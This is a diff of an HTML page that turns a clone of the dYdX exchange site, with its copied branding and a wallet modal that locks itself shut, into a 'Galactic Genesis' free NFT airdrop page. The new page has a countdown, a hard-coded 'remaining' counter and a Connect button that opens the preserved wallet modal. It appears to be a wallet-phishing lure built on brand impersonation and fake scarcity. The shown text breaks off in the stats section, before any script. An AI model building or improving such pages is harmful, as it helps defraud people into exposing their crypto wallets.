@@ -1,103 +1,421 @@
 <!DOCTYPE html>
-<html lang="en" data-wf-domain="www.dydx.xyz" data-wf-page="6840200ae64207c7070994da" data-wf-site="649ca755d082f1dfc4ed62a4" class="w-mod-js w-mod-ix">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>dYdX: DeFi's Pro Trading Platform</title>
-    <meta name="description" content="dYdX offers a decentralized trading platform designed for perpetual contracts, combining deep liquidity, advanced trading tools, and low fees.">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Genesis | Free NFT Airdrop</title>
+    <meta name="description" content="Claim your free Galactic Genesis NFT - Limited edition collection on Solana. Connect your wallet to mint your unique NFT.">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <link href="https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/css/dydx-unlimited-lp.shared.77e224cce.css" rel="stylesheet" type="text/css">
-
+    
     <style>
-        .anti-flicker, .anti-flicker * {
-            visibility: hidden !important;
-            opacity: 0 !important;
-        }
-
         * {
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-            -o-font-smoothing: antialiased;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
-        .word {
-            display: inline-block;
-            overflow: hidden;
-            padding-bottom: 0.1em;
-            margin-bottom: -0.2em;
-            transform-origin: bottom;
-        }
-
-        :root {
-            --dydx-components---size--size-4: clamp(0.5rem, 0.2225rem + 1.11vw, 1rem);
-            --dydx-components---size--size-4-5: clamp(0.6rem, 0.3075rem + 1.17vw, 1.125rem);
-            --dydx-components---size--size-5: clamp(0.7rem, 0.395rem + 1.22vw, 1.25rem);
-            --dydx-components---size--size-6: clamp(0.8rem, 0.41rem + 1.56vw, 1.5rem);
-            --dydx-components---size--size-7: clamp(0.9rem, 0.4275rem + 1.89vw, 1.75rem);
-            --dydx-components---size--size-8: clamp(1rem, 0.445rem + 2.22vw, 2rem);
-            --dydx-components---size--size-9: clamp(1.25rem, 0.695rem + 2.22vw, 2.25rem);
-            --dydx-components---size--size-10: clamp(1.5rem, 0.945rem + 2.22vw, 2.5rem);
-            --dydx-components---size--size-11: clamp(1.75rem, 1.195rem + 2.22vw, 2.75rem);
-            --dydx-components---size--size-12: clamp(2rem, 1.445rem + 2.22vw, 3rem);
-            --dydx-components---size--size-14: clamp(2.25rem, 1.555rem + 2.78vw, 3.5rem);
-            --dydx-components---size--size-16: clamp(2.5rem, 1.6675rem + 3.33vw, 4rem);
-            --dydx-components---size--size-20: clamp(2.75rem, 1.5rem + 5vw, 5rem);
-            --dydx-components---size--size-24: clamp(3rem, 1.3325rem + 6.67vw, 6rem);
-            --dydx-components---size--size-28: clamp(3.25rem, 1.1675rem + 8.33vw, 7rem);
-            --dydx-components---size--size-32: clamp(3.5rem, 1rem + 10vw, 8rem);
-            --dydx-components---size--size-36: clamp(3.75rem, 0.8325rem + 11.67vw, 9rem);
-            --dydx-components---size--size-40: clamp(4rem, 0.6675rem + 13.33vw, 10rem);
-            --dydx-components---size--size-44: clamp(4.5rem, 0.89rem + 14.44vw, 11rem);
-            --dydx-components---size--size-48: clamp(5.25rem, 1.5rem + 15vw, 12rem);
-            --dydx-components---size--size-52: clamp(6rem, 2.11rem + 15.56vw, 13rem);
-            --dydx-components---size--size-56: clamp(6.75rem, 2.7225rem + 16.11vw, 14rem);
-            --dydx-components---size--size-60: clamp(7.5rem, 3.3325rem + 16.67vw, 15rem);
-            --dydx-components---size--size-64: clamp(8.25rem, 3.945rem + 17.22vw, 16rem);
-            --dydx-components---size--size-72: clamp(8.75rem, 3.61rem + 20.56vw, 18rem);
-            --dydx-components---size--size-80: clamp(9.25rem, 3.2775rem + 23.89vw, 20rem);
-            --dydx-components---size--size-96: clamp(10rem, 2.2225rem + 31.11vw, 24rem);
-            --dydx-components---text--display: clamp(2.875rem, 1rem + 7.5vw, 6.25rem);
-            --dydx-components---h1--font-size: clamp(3.125rem, 2.0825rem + 4.17vw, 5rem);
-            --dydx-components---h2--font-size: clamp(1.875rem, 0.8325rem + 4.17vw, 3.75rem);
-            --dydx-components---h3--font-size: clamp(1.25rem, 0.695rem + 2.22vw, 2.25rem);
-            --dydx-components---h4--font-size: clamp(1.15rem, 0.8175rem + 1.33vw, 1.75rem);
-            --dydx-components---h5--font-size: clamp(1rem, 0.7225rem + 1.11vw, 1.5rem);
-            --dydx-components---text--button: clamp(1.125rem, 1.055rem + 0.28vw, 1.25rem);
-            --dydx-components---text--tiny: clamp(0.75rem, 0.68rem + 0.28vw, 0.875rem);
-            --dydx-components---text--paragraph: clamp(0.875rem, 0.735rem + 0.56vw, 1.125rem);
-            --dydx-components---section-space--xl: clamp(4.16rem, -2.28rem + 25.76vw, 15.75rem);
-            --dydx-components---section-space--large: clamp(2.97rem, -1.2125rem + 16.73vw, 10.5rem);
-            --dydx-components---section-space--base: clamp(2.125rem, -0.5825rem + 10.83vw, 7rem);
-            --dydx-components---section-space--small: clamp(1.52rem, -0.23rem + 7vw, 4.67rem);
-            --dydx-components---section-space--xs: clamp(1.08rem, -0.0475rem + 4.51vw, 3.11rem);
-        }
-
-        body, html {
-            font-family: 'Inter', 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Open Sans', 'Helvetica Neue', sans-serif;
-            font-weight: 400;
-            line-height: 1.6;
-        }
-
-        .ks-text-lg, .ks-mb-2-3 {
-            font-family: 'Inter', 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Open Sans', 'Helvetica Neue', sans-serif;
-            font-weight: 400;
-            font-size: clamp(1.125rem, 1rem + 0.5vw, 1.25rem);
-            line-height: 1.7;
-            color: rgba(255, 255, 255, 0.9);
-        }
-
-        h1, h2, h3, h4, h5, h6, .ks-h1-2, .ks-h2-6 {
-            font-family: 'Inter', 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Open Sans', 'Helvetica Neue', sans-serif;
-            font-weight: 700;
-            line-height: 1.2;
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #0a0a1a 50%, #0a0a2a 100%);
+            min-height: 100vh;
             color: #ffffff;
+            overflow-x: hidden;
         }
 
-        .text-weight-semibold {
-            font-weight: 600 !important;
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
         }
 
-        /* Wallet Modal Styles */
+        .bg-animation::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 20% 50%, rgba(105, 102, 255, 0.15) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(139, 92, 246, 0.1) 0%, transparent 50%);
+            animation: slowMove 20s ease-in-out infinite;
+        }
+
+        @keyframes slowMove {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(-5%, -5%); }
+        }
+
+        /* Floating particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(105, 102, 255, 0.3);
+            border-radius: 50%;
+            pointer-events: none;
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+        }
+
+        /* Navbar */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            background: rgba(10, 10, 20, 0.8);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(105, 102, 255, 0.2);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #6966FF, #8B5CF6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .logo span {
+            font-size: 14px;
+            background: none;
+            -webkit-background-clip: unset;
+            background-clip: unset;
+            color: rgba(255,255,255,0.6);
+            font-weight: 400;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            align-items: center;
+        }
+
+        .nav-links a {
+            color: rgba(255,255,255,0.7);
+            text-decoration: none;
+            transition: color 0.3s;
+            font-size: 14px;
+        }
+
+        .nav-links a:hover {
+            color: #6966FF;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 60px 20px 40px;
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(105, 102, 255, 0.2);
+            border: 1px solid rgba(105, 102, 255, 0.4);
+            border-radius: 100px;
+            padding: 8px 20px;
+            font-size: 14px;
+            margin-bottom: 30px;
+            backdrop-filter: blur(5px);
+        }
+
+        .badge::before {
+            content: '🎨';
+            margin-right: 8px;
+        }
+
+        h1 {
+            font-size: clamp(2.5rem, 5vw, 4.5rem);
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffffff, #6966FF, #8B5CF6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            font-size: clamp(1rem, 2vw, 1.2rem);
+            color: rgba(255,255,255,0.7);
+            max-width: 600px;
+            margin: 0 auto 30px;
+        }
+
+        /* NFT Preview Grid */
+        .nft-preview {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 50px 0;
+            flex-wrap: wrap;
+        }
+
+        .nft-card {
+            background: rgba(30, 30, 50, 0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 15px;
+            width: 180px;
+            text-align: center;
+            border: 1px solid rgba(105, 102, 255, 0.3);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .nft-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(105, 102, 255, 0.2);
+            border-color: #6966FF;
+        }
+
+        .nft-card img {
+            width: 100%;
+            border-radius: 12px;
+            margin-bottom: 12px;
+        }
+
+        .nft-card h4 {
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .nft-card p {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+        }
+
+        /* Countdown Timer */
+        .countdown {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            margin: 30px 0;
+            border: 1px solid rgba(105, 102, 255, 0.3);
+        }
+
+        .countdown-label {
+            font-size: 14px;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 15px;
+        }
+
+        .timer {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+
+        .timer-block {
+            text-align: center;
+        }
+
+        .timer-number {
+            font-size: 36px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #6966FF, #8B5CF6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            min-width: 60px;
+        }
+
+        .timer-label {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+        }
+
+        /* Connect Button */
+        .connect-section {
+            text-align: center;
+            margin: 40px 0;
+        }
+
+        .connect-btn {
+            background: linear-gradient(135deg, #6966FF, #8B5CF6);
+            border: none;
+            padding: 18px 48px;
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(105, 102, 255, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .connect-btn:hover::before {
+            left: 100%;
+        }
+
+        .connect-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 25px rgba(105, 102, 255, 0.6);
+        }
+
+        .wallet-requirement {
+            margin-top: 20px;
+            font-size: 14px;
+            color: rgba(255,255,255,0.5);
+        }
+
+        .wallet-requirement span {
+            color: #6966FF;
+        }
+
+        /* Stats Section */
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin: 50px 0;
+            flex-wrap: wrap;
+        }
+
+        .stat-card {
+            text-align: center;
+            background: rgba(30, 30, 50, 0.4);
+            backdrop-filter: blur(5px);
+            padding: 20px 30px;
+            border-radius: 20px;
+            border: 1px solid rgba(105, 102, 255, 0.2);
+        }
+
+        .stat-number {
+            font-size: 28px;
+            font-weight: 800;
+            color: #6966FF;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: rgba(255,255,255,0.6);
+            margin-top: 5px;
+        }
+
+        /* Recent Claims */
+        .recent-claims {
+            background: rgba(30, 30, 50, 0.4);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 20px;
+            margin: 40px 0;
+            border: 1px solid rgba(105, 102, 255, 0.2);
+        }
+
+        .recent-claims h3 {
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+
+        .claims-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .claim-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+            padding: 8px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .claim-item .check {
+            color: #4CAF50;
+        }
+
+        .claim-item .address {
+            font-family: monospace;
+            color: rgba(255,255,255,0.8);
+        }
+
+        .claim-item .nft-name {
+            color: #8B5CF6;
+            margin-left: auto;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 40px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            margin-top: 60px;
+        }
+
+        .footer p {
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .navbar {
+                padding: 15px 20px;
+            }
+            .nav-links {
+                gap: 15px;
+            }
+            .nav-links a {
+                font-size: 11px;
+            }
+            .nft-card {
+                width: 140px;
+            }
+            .timer {
+                gap: 15px;
+            }
+            .timer-number {
+                font-size: 24px;
+                min-width: 40px;
+            }
+        }
+
+        /* Original wallet modal styles preserved */
         .wallet-modal {
             position: fixed;
             top: 0;
@@ -130,8 +448,6 @@
             width: 100%;
             overflow: hidden;
             box-shadow: 0 24px 80px rgba(0, 0, 0, 0.6);
-            transform: scale(1);
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         .wallet-modal-header {
@@ -139,7 +455,6 @@
             align-items: center;
             justify-content: space-between;
             padding: 32px 32px 24px 32px;
-            border-bottom: none;
         }
 
         .wallet-modal-header h3 {
@@ -163,7 +478,6 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.2s ease;
             border-radius: 6px;
             position: absolute;
             right: 16px;
@@ -193,39 +507,13 @@
             border: 1px solid #3a3a3a;
             border-radius: 16px;
             cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            text-align: left;
-            width: 100%;
-            position: relative;
-            overflow: hidden;
+            transition: all 0.3s;
         }
 
-        .wallet-option::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(135deg, rgba(105, 102, 255, 0.1), rgba(139, 92, 246, 0.1));
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-
-        .wallet-option:hover:not(:disabled) {
+        .wallet-option:hover {
             background: #333;
-            border-color: rgba(105, 102, 255, 0.5);
+            border-color: #6966FF;
             transform: translateY(-2px);
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-        }
-
-        .wallet-option:hover:not(:disabled)::before {
-            opacity: 1;
-        }
-
-        .wallet-option:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
         }
 
         .wallet-icon {
@@ -233,18 +521,10 @@
             height: 48px;
             border-radius: 12px;
             margin-right: 20px;
-            flex-shrink: 0;
-            position: relative;
-            z-index: 1;
         }
 
         .wallet-info {
             flex: 1;
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-            position: relative;
-            z-index: 1;
         }
 
         .wallet-name {
@@ -253,31 +533,20 @@
             font-weight: 600;
         }
 
-        .wallet-description {
-            color: #999;
-            font-size: 14px;
-        }
-
         .wallet-status {
             display: flex;
             align-items: center;
             gap: 8px;
-            position: relative;
-            z-index: 1;
+            margin-top: 6px;
         }
 
         .status-text {
             font-size: 12px;
             color: #999;
-            font-weight: 500;
         }
 
         .status-installed {
             color: #4CAF50 !important;
-        }
-
-        .status-not-installed {
-            color: #f44336 !important;
         }
 
         .status-dot {
@@ -289,11 +558,6 @@
 
         .status-dot.installed {
             background: #4CAF50;
-            box-shadow: 0 0 8px rgba(76, 175, 80, 0.5);
-        }
-
-        .status-dot.not-installed {
-            background: #f44336;
         }
 
         .wallet-loading-state {
@@ -316,9 +580,6 @@
             justify-content: center;
             margin: 0 auto 24px;
             position: relative;
-            overflow: hidden;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
         }
 
         .wallet-loading-spinner::before {
@@ -331,92 +592,12 @@
             border-radius: 20px;
             border: 3px solid transparent;
             border-top: 3px solid #6966FF;
-            animation: waveRotate 1s linear infinite;
+            animation: spin 1s linear infinite;
         }
 
-        .wallet-loading-spinner::after {
-            content: '';
-            position: absolute;
-            top: 3px;
-            left: 3px;
-            right: 3px;
-            bottom: 3px;
-            border-radius: 17px;
-            background: #2a2a2a;
-            z-index: 1;
-        }
-
-        .wallet-loading-spinner.rejected {
-            box-shadow: 0 4px 20px rgba(244, 67, 54, 0.4);
-        }
-
-        .wallet-loading-spinner.rejected::before {
-            border-top: 3px solid #f44336;
-            animation: waveRotateFast 0.8s linear infinite;
-        }
-
-        .wallet-loading-spinner.solflare::before {
-            border-top: 3px solid #FEB602;
-        }
-
-        .phantom-icon {
-            width: 40px;
-            height: 40px;
-            border-radius: 10px;
-            position: relative;
-            z-index: 2;
-            transition: all 0.3s ease;
-        }
-
-        .phantom-icon.rejected {
-            fill: #ff4444 !important;
-            animation: shake 0.5s ease-in-out;
-        }
-
-        .solflare-icon.rejected {
-            fill: #ff4444 !important;
-            animation: shake 0.5s ease-in-out;
-        }
-
-        .wallet-loading-spinner img.rejected {
-            filter: hue-rotate(0deg) saturate(2) brightness(1.2) !important;
-            animation: shake 0.5s ease-in-out;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-
-        .wallet-modal-content.shake {
-            animation: modalShake 0.6s ease-in-out;
-        }
-
-        .wallet-modal.locked .wallet-modal-overlay {
-            pointer-events: none;
-        }
-
-        .wallet-modal.locked .wallet-modal-close {
-            opacity: 0.3;
-            pointer-events: none;
-            cursor: not-allowed;
-        }
-
-        @keyframes waveRotate {
+        @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-
-        @keyframes waveRotateFast {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        @keyframes modalShake {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-8px); }
-            20%, 40%, 60%, 80% { transform: translateX(8px); }
         }
 
         .wallet-loading-title {
@@ -429,259 +610,265 @@
         .wallet-loading-subtitle {
             color: #999;
             font-size: 14px;
-            line-height: 1.6;
-            max-width: 280px;
-            margin: 0 auto;
         }
 
         .wallet-options.hidden {
             display: none;
         }
-
-        @media (max-width: 480px) {
-            .wallet-modal {
-                padding: 16px;
-            }
-
-            .wallet-modal-content {
-                width: 100%;
-                max-width: 340px;
-                border-radius: 20px;
-            }
-
-            .wallet-modal-header {
-                padding: 24px 24px 20px 24px;
-            }
-
-            .wallet-modal-body {
-                padding: 0 24px 24px 24px;
-            }
-
-            .wallet-option {
-                padding: 16px;
-                border-radius: 14px;
-            }
-
-            .wallet-icon {
-                width: 40px;
-                height: 40px;
-                margin-right: 16px;
-            }
-
-            .wallet-loading-state {
-                padding: 40px 24px;
-            }
-
-            .wallet-loading-spinner {
-                width: 64px;
-                height: 64px;
-                border-radius: 16px;
-            }
-
-            .wallet-loading-spinner::after {
-                top: 2px;
-                left: 2px;
-                right: 2px;
-                bottom: 2px;
-                border-radius: 14px;
-            }
-
-            .phantom-icon {
-                width: 32px;
-                height: 32px;
-            }
-        }
     </style>
 </head>
-<body class="ks-bg-color-black">
-    <div class="global-code-embed">
-        <div class="w-embed">
-            <style>
-                .text-weight-semibold {
-                    font-weight: 600 !important;
-                }
-            </style>
+<body>
+
+<div class="bg-animation"></div>
+<div class="particles" id="particles"></div>
+
+<!-- Navbar -->
+<nav class="navbar">
+    <div class="logo">Galactic Genesis <span>NFT</span></div>
+    <div class="nav-links">
+        <a href="#">Mint</a>
+        <a href="#">Collection</a>
+        <a href="#">Roadmap</a>
+        <a href="#">Team</a>
+    </div>
+</nav>
+
+<!-- Main Container -->
+<div class="container">
+    <div class="hero">
+        <div class="badge">Limited Edition Airdrop</div>
+        <h1>Free NFT Airdrop<br>For Early Supporters</h1>
+        <p class="subtitle">Claim your exclusive Galactic Genesis NFT before they're gone. Limited supply of 10,000 unique pieces.</p>
+    </div>
+
+    <!-- NFT Preview -->
+    <div class="nft-preview">
+        <div class="nft-card">
+            <img src="https://placehold.co/200x200/6966FF/white?text=GENESIS" alt="NFT Preview">
+            <h4>Genesis #0001</h4>
+            <p>Rarity: Legendary</p>
+        </div>
+        <div class="nft-card">
+            <img src="https://placehold.co/200x200/8B5CF6/white?text=NEBULA" alt="NFT Preview">
+            <h4>Nebula #0420</h4>
+            <p>Rarity: Epic</p>
+        </div>
+        <div class="nft-card">
+            <img src="https://placehold.co/200x200/FF66FF/white?text=STAR" alt="NFT Preview">
+            <h4>Star #1337</h4>
+            <p>Rarity: Rare</p>
+        </div>
+        <div class="nft-card">
+            <img src="https://placehold.co/200x200/66FF99/white?text=VOID" alt="NFT Preview">
+            <h4>Void #9999</h4>
+            <p>Rarity: Mythic</p>
         </div>
     </div>
 
-    <div data-animation="default" class="navbar1_component w-nav" data-easing2="ease" data-easing="ease" data-collapse="medium" role="banner" data-duration="400">
-        <div class="navbar1_container u-container">
-            <a href="/" class="navbar1_logo-link w-nav-brand" aria-label="home">
-                <div class="ks-navbar-logo desktop w-embed">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="115" height="48" viewBox="0 0 154 48" fill="none">
-                        <path d="M142.799 0L109.594 47.5714H119.788L153.166 0H142.799Z" fill="white"></path>
-                        <path d="M120.848 0L130.618 14.0177L125.521 21.6637L110.441 0H120.848Z" fill="url(#paint0_linear_1338_499)"></path>
-                        <path d="M143.788 47.5751L132.956 32.0707L138.053 24.637L153.982 47.5751H143.788Z" fill="url(#paint1_linear_1338_499)"></path>
-                        <path fill-rule="evenodd" clip-rule="evenodd" d="M97.6986 0H106.619V47.5714H97.6986V45.7946C95.1223 47.2005 92.1645 48 89.0192 48C79.0329 48 70.9375 39.9411 70.9375 30C70.9375 20.0589 79.0329 12 89.0192 12C92.1645 12 95.1223 12.7995 97.6986 14.2054V0ZM88.9239 40.0999C94.5799 40.0999 99.1649 35.5356 99.1649 29.9052C99.1649 24.2748 94.5799 19.7105 88.9239 19.7105C83.268 19.7105 78.683 24.2748 78.683 29.9052C78.683 35.5356 83.268 40.0999 88.9239 40.0999Z" fill="white"></path>
-                        <path d="M71.8249 0L38.6543 47.5714H49.0534L82.1918 0H71.8249Z" fill="white"></path>
-                        <path d="M49.0623 0L59.4694 14.4425L53.7349 22.5133L38.2305 0H49.0623Z" fill="url(#paint2_linear_1338_499)"></path>
-                        <path fill-rule="evenodd" clip-rule="evenodd" d="M26.7611 0H35.6814V47.5714H26.7611V45.7946C24.1848 47.2005 21.227 48 18.0817 48C8.09544 48 0 39.9411 0 30C0 20.0589 8.09544 12 18.0817 12C21.227 12 24.1848 12.7995 26.7611 14.2054V0ZM17.9864 40.0999C23.6424 40.0999 28.2274 35.5356 28.2274 29.9052C28.2274 24.2748 23.6424 19.7105 17.9864 19.7105C12.3305 19.7105 7.74549 24.2748 7.74549 29.9052C7.74549 35.5356 12.3305 40.0999 17.9864 40.0999Z" fill="white"></path>
-                        <defs>
-                            <linearGradient id="paint0_linear_1338_499" x1="118.512" y1="2.97345" x2="132.498" y2="19.8577" gradientUnits="userSpaceOnUse">
-                                <stop stop-color="white"></stop>
-                                <stop offset="1" stop-color="white" stop-opacity="0.55"></stop>
-                            </linearGradient>
-                            <linearGradient id="paint1_linear_1338_499" x1="146.124" y1="43.9645" x2="128.94" y2="20.7992" gradientUnits="userSpaceOnUse">
-                                <stop stop-color="#6966FF"></stop>
-                                <stop offset="1" stop-color="#6966FF" stop-opacity="0.36"></stop>
-                            </linearGradient>
-                            <linearGradient id="paint2_linear_1338_499" x1="46.726" y1="3.09006" x2="61.2248" y2="20.8192" gradientUnits="userSpaceOnUse">
-                                <stop stop-color="white"></stop>
-                                <stop offset="1" stop-color="white" stop-opacity="0.55"></stop>
-                            </linearGradient>
-                        </defs>
-                    </svg>
-                </div>
-                <div class="ks-navbar-logo mobile w-embed">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="75" height="24" viewBox="0 0 75 24" fill="none">
-                        <path d="M68.6586 0L52.6934 22.8727H57.595L73.6431 0H68.6586Z" fill="white"></path>
-                        <path d="M58.1054 0L62.8028 6.73982L60.352 10.4161L53.1016 0H58.1054Z" fill="url(#paint0_linear_1036_360)"></path>
-                        <path d="M69.1354 22.8745L63.9274 15.4198L66.3782 11.8457L74.0371 22.8745H69.1354Z" fill="url(#paint1_linear_1036_360)"></path>
-                        <path fill-rule="evenodd" clip-rule="evenodd" d="M46.9744 0H51.2633V22.8727H46.9744V22.0184C45.7356 22.6944 44.3135 23.0788 42.8012 23.0788C37.9998 23.0788 34.1074 19.204 34.1074 14.4242C34.1074 9.64447 37.9998 5.7697 42.8012 5.7697C44.3135 5.7697 45.7356 6.15409 46.9744 6.83008V0ZM42.7554 19.2803C45.4749 19.2803 47.6794 17.0858 47.6794 14.3787C47.6794 11.6715 45.4749 9.47697 42.7554 9.47697C40.036 9.47697 37.8315 11.6715 37.8315 14.3787C37.8315 17.0858 40.036 19.2803 42.7554 19.2803Z" fill="white"></path>
-                        <path d="M34.5346 0L18.5859 22.8727H23.5859L39.5191 0H34.5346Z" fill="white"></path>
-                        <path d="M23.5889 0L28.5927 6.94406L25.8355 10.8246L18.3809 0H23.5889Z" fill="url(#paint2_linear_1036_360)"></path>
-                        <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8669 0H17.1559V22.8727H12.8669V22.0184C11.6282 22.6944 10.2061 23.0788 8.69382 23.0788C3.89235 23.0788 0 19.204 0 14.4242C0 9.64447 3.89235 5.7697 8.69382 5.7697C10.2061 5.7697 11.6282 6.15409 12.8669 6.83008V0ZM8.64802 19.2803C11.3674 19.2803 13.572 17.0858 13.572 14.3787C13.572 11.6715 11.3674 9.47697 8.64802 9.47697C5.92861 9.47697 3.72409 11.6715 3.72409 14.3787C3.72409 17.0858 5.92861 19.2803 8.64802 19.2803Z" fill="white"></path>
-                        <defs>
-                            <linearGradient id="paint0_linear_1036_360" x1="56.9821" y1="1.42966" x2="63.7067" y2="9.54774" gradientUnits="userSpaceOnUse">
-                                <stop stop-color="white"></stop>
-                                <stop offset="1" stop-color="white" stop-opacity="0.55"></stop>
-                            </linearGradient>
-                            <linearGradient id="paint1_linear_1036_360" x1="70.2587" y1="21.1385" x2="61.9967" y2="10.0004" gradientUnits="userSpaceOnUse">
-                                <stop stop-color="#6966FF"></stop>
-                                <stop offset="1" stop-color="#6966FF" stop-opacity="0.36"></stop>
-                            </linearGradient>
-                            <linearGradient id="paint2_linear_1036_360" x1="22.4656" y1="1.48572" x2="29.4367" y2="10.01" gradientUnits="userSpaceOnUse">
-                                <stop stop-color="white"></stop>
-                                <stop offset="1" stop-color="white" stop-opacity="0.55"></stop>
-                            </linearGradient>
-                        </defs>
-                    </svg>
-                </div>
-            </a>
-            <nav role="navigation" class="navbar1_menu is-page-height-tablet w-nav-menu">
-                <div class="navbar1_menu-links">
-                    <a href="#" class="navbar1_link w-nav-link">VIP</a>
-                    <a href="#" class="navbar1_link w-nav-link">Fees</a>
-                    <a href="#" class="navbar1_link w-nav-link">API</a>
-                    <a href="#" class="navbar1_link w-nav-link">Blog</a>
-                    <a href="#" class="navbar1_link w-nav-link">App Download</a>
-                </div>
-                <div class="navbar1_menu-buttons">
-                    <button type="button" id="connect-wallet" class="button w-button">Connect Wallet</button>
-                </div>
-            </nav>
-            <div class="navbar1_menu-button w-nav-button">
-                <div class="menu-icon1">
-                    <div class="menu-icon1_line-top"></div>
-                    <div class="menu-icon1_line-middle">
-                        <div class="menu-icon1_line-middle-inner"></div>
-                    </div>
-                    <div class="menu-icon1_line-bottom"></div>
-                </div>
+    <!-- Stats -->
+    <div class="stats">
+        <div class="stat-card">
+            <div class="stat-number">10,000</div>
+            <div class="stat-label">Total Supply</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="remaining-count">7,843</div>
